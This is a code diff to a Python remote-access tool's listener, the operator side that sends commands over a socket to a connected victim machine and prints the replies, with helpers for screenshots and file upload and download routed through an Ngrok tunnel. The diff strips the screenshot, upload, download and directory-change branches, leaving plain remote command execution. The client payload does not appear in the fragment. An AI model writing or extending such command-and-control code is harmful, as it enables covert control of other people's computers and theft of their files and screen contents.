@@ -16,22 +16,9 @@ def start_listener(host, port):
 
         if command.lower() == "exit":
             break
-
-        if command.lower() == "screenshot":
-            client_socket.send(command.encode())
-            receive_screenshot(client_socket)
-        elif command.lower() == "upload":
-            client_socket.send(command.encode())
-            upload_files(client_socket)
-        elif command.lower() == "download":
-            client_socket.send(command.encode())
-            download_file(client_socket)
-        elif command.lower().startswith("cd "):
-            client_socket.send(command.encode())
-        else:
-            client_socket.send(command.encode())
-            response = client_socket.recv(4096).decode()
-            print(response)
+        client_socket.send(command.encode())
+        response = client_socket.recv(4096).decode()
+        print(response)
 
     client_socket.close()
     listener.close()
@@ -87,6 +74,6 @@ def download_file(client_socket):
     print(f"[*] 📥 File '{file_name}' downloaded successfully")
 
 if __name__ == "__main__":
-    host = "NGROK_TUNNEL_URL"  # Replace with your Ngrok tunnel URL
+    host = "host"  # Replace with your Ngrok tunnel URL
     port = 1234  # Choose a port number
     start_listener(host, port)
